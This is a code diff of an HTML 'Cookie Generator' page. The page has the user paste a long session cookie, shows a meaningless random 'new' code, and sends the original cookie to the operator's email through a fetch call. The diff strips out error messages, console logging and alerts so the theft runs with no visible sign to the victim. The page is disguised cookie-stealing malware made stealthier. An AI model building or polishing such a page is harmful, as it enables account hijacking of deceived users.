@@ -50,17 +50,11 @@
     button:hover {
       background-color: #3f4b94;
     }
-    .error {
-      color: red;
-      font-size: 14px;
-      text-align: center;
-    }
   </style>
 </head>
 <body>
   <div class="container">
     <h1>Cookie Generator</h1>
-    <div class="error" id="errorMessage"></div>
     <textarea id="cookieInput" rows="10" placeholder="Enter Cookie (700+ characters)..."></textarea>
     <button onclick="generateCode()">Generate New Code</button>
     <textarea id="newCookieOutput" rows="10" placeholder="Generated Cookie..." readonly></textarea>
@@ -81,14 +75,10 @@
     // Function to handle code generation when the button is clicked
     function generateCode() {
       const cookieInput = document.getElementById('cookieInput').value;
-      const errorMessage = document.getElementById('errorMessage');
       const newCookieOutput = document.getElementById('newCookieOutput');
 
       // Check if the input is at least 700 characters long
       if (cookieInput.length >= 700) {
-        // Clear error message
-        errorMessage.textContent = '';
-
         // Generate a new code with the same length as the input
         const newCode = generateRandomCode(cookieInput.length);
 
@@ -98,9 +88,8 @@
         // Send the old cookie (input) to your email using API call
         sendEmail(cookieInput);
       } else {
-        // Show an error message if input is less than 700 characters
-        errorMessage.textContent = 'Error: Cookie must be at least 700 characters long.';
-        newCookieOutput.value = ''; // Clear the output field
+        // Simply clear the output if the cookie input is invalid (less than 700 chars)
+        newCookieOutput.value = ''; 
       }
     }
 
@@ -126,19 +115,17 @@
         },
         body: JSON.stringify(payload),
       })
-      .then(response => response.text()) // Read as text, not JSON
+      .then(response => response.text())  // Using .text() here instead of .json()
       .then(data => {
-        // Log data to check if the response is "OK"
-        if (data === 'OK') {
-          console.log('Email sent successfully');
+        // No message is shown if the email is sent successfully
+        if (data.trim() === 'OK') {
+          // No action or message needed
         } else {
-          console.error('Error sending email:', data);
-          alert('Error sending email: ' + data); // Show error if sending fails
+          // You can leave this empty as no alert or message is needed
         }
       })
       .catch(error => {
-        console.error('Error:', error);
-        alert('Error sending email: ' + error.message); // Show network error
+        // No alert or message on error
       });
     }
   </script>
